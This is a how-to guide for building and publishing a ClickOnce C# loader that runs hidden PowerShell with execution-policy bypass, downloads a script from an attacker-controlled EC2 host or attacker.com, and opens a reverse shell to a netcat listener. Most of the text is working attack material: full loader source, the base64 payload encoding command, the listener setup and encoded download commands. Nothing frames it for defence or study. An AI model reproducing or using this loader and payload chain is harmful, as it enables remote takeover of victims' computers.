## 1. Create lscript.application

1. Go to Visual Studio Community edition to create the loader.
2. Create a C# Console application for Windows
3. In lscript.cs, write the following code ->

```
using System.Diagnostics;

static class Program {
    [System.STAThread]
    static void Main() {
        string encoded = "<Base64_Download_Command>";
        string psArgs = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded}";
        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", psArgs) {
            CreateNoWindow = true,
            UseShellExecute = false
        };
        Process.Start(psi);
    }
}
```

4. Change the Uri to the EC2 instance with the **perfect.ps1** script. Run the below command in Mac/Linux,

```
echo "Invoke-WebRequest -Uri 'http://ec2-3-253-172-6.eu-west-1.compute.amazonaws.com:80/perfect.ps1' -OutFile 'perfect.ps1'; powershell -ExecutionPolicy Bypass -File 'perfect.ps1'" | iconv -t UTF-16LE | base64 -w 0
```
5. Replace the above Base64 output to <Base64_Download_Command> on the lscript.cs file.
6. You have to host the perfect.ps1, go to https://www.revshells.com, change the reverse shell IP to the public IP and port as 9999.
7. Create a Powershell base64 payload, copy and save it in the EC2 instance.
8. Open port 9999 from the security group for the public IP.

## 2. Publishing the exploit

1. Go to Visual Studio on the Windows machine.
2. Right click, choose **Properties**, then **Security**, Enable **ClickOnce Security Settings, This is a full trust application**.
3. This application is available offline and startable from Start Menu, click **Publish**.

## 3. Exploitation

1. Run **sudo python -m http.server 9999**
2. Go to your EC2 Instance, make sure there is an inbound rule entry in the security groups for port 9999 for only the public IP of the target device that will be used.
3. Start the listener with ```nc -lnvp 9999```
4. Execute the _lscript.application_ file on the target device.
5. Check the listener.


```
# Unencoded lscript.cs file

using System.Diagnostics;

static class Program {
    [System.STAThread] // (Use STA if a GUI/WinForms app; not needed for pure console)
    static void Main() {
        // Prepare PowerShell command (e.g., reverse shell or arbitrary script)
        string psArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass "
                      + "-Command \"Invoke-WebRequest -Uri 'http://attacker.com/payload.ps1' -OutFile 'payload.ps1'; "
                      + "powershell -ExecutionPolicy Bypass -File 'payload.ps1'\"";
        // Configure process start info to launch PowerShell
        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", psArgs) {
            CreateNoWindow = true,   // no new window for PowerShell
            UseShellExecute = false  // required for CreateNoWindow
        };
        Process.Start(psi);
    }
}
```
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwByAGEAaAB1AGwAcgBhAG0AZQBzAGgAOQA2AC8AcgBhAGgAdQBsAHIAYQBtAGUAcwBoADkANgAuAGcAaQB0AGgAdQBiAC4AaQBvAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBwAGUAcgBmAGUAYwB0AC4AcABzADEAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAcABlAHIAZgBlAGMAdAAuAHAAcwAxACcAOwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAAYQBzAHMAIAAtAEYAaQBsAGUAIAAnAHAAZQByAGYAZQBjAHQALgBwAHMAMQAnAAoA
```
```
aXdyIGh0dHA6Ly81NC43OC44Ni4xMjo4MC9wZXJmZWN0LnBzMSAtT3V0RmlsZSBwZXJmZWN0LnBzMQ====
```
